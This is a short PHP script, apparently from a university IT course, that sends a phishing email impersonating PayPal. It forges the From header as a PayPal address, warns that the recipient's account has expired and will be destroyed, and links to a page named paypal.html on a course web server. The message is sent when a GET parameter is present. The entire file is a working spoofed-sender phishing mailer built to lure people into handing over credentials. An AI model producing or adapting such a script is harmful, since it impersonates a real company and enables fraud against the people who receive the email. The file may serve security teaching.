<?php

$to = "targetperson332@mailinator.com";
$from = "paypal-customerservice@paypal.com";
$headers = "From: paypal-customerservice@paypal.com";
$subject = "Your PayPal Account Has Expired";
$txt = "Dear Customer, \n
		Please be aware that your account expired.  It is indispensible to perform an audit of your data
		is present, otherwise your account will be destroyed.  Just click the link below. \n
		<a href=\"https://web.njit.edu/~jnk6/IT332/paypal.html\">Click here</a> \n\n";
$txt .= "We requests verification whenever an email address is selected as an account.  Your account cannot be used
		until you verify it.\n\n
		Sincerely, \n
		PayPal Support \n\n
		Please do not reply to this message.";
if(isset($_GET["email"]))
{
	echo "$to<br>";
    	echo "$txt";
    	mail($to,$subject,$txt,$headers);
}
?>
